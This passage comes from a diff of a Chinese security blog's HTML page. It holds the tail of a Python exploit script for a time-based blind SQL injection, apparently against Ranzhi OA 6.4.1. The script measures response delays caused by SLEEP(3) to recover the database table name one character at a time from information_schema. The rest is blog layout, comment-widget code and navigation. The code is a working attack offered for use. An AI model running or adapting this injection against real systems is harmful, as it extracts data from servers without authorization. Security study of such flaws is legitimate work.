payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies, proxies=proxies)</div><div class="line">        att_time = (time.time() - start)</div><div class="line"></div><div class="line">        if att_time - nor_time &gt; 2:</div><div class="line">            table_len = i</div><div class="line">            break</div><div class="line"></div><div class="line"></div><div class="line">    print(&quot;db_len: %d&quot; %(table_len))</div><div class="line"></div><div class="line">    table_name = &quot;&quot;</div><div class="line">    for i in range(1, table_len + 1):</div><div class="line">        for j in range(1, 129):</div><div class="line">            payload = get_payload_encode(</div><div class="line">                &apos;&apos;&apos;select if(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables where table_schema=database() LIMIT 0,1) ,&#123;&#125; ,1))=&#123;&#125;, SLEEP(3), 1);&apos;&apos;&apos;.format(</div><div class="line">                    i, j))</div><div class="line"></div><div class="line">            start = time.time()</div><div class="line">            requests.get(host)</div><div class="line">            nor_time = (time.time() - start)</div><div class="line"></div><div class="line">            start = time.time()</div><div class="line">            requests.get(target + payload.decode(&quot;utf-8&quot;), headers=headers, cookies=cookies)</div><div class="line">            att_time = (time.time() - start)</div><div class="line">            if att_time - nor_time &gt; 2:</div><div class="line">                table_name += chr(j)</div><div class="line">                print(table_name)</div><div class="line">                break</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    get_table_name(host)</div></pre></td></tr></table></figure>
+
+        
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            <a>本站文章均原创， 转载注明来源</a>
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html">http://blog.hac425.top/2018/03/13/ranzhi_oa_641_exp.html</a>
+                    </p>
+                </blockquote>
+        
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 来必力 -->
+<div id="livere-comment">
+    <!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zMTQ2OC84MDMy">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+</div>
+<style>
+    #livere-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/03/12/ranzhi_oa_6_4_1_sqli_to_getshell.html" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -598,6 +836,14 @@ It will not impact the appearance and can give developers a lot of support :)
 </aside>
 
                     
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
 
                     
 
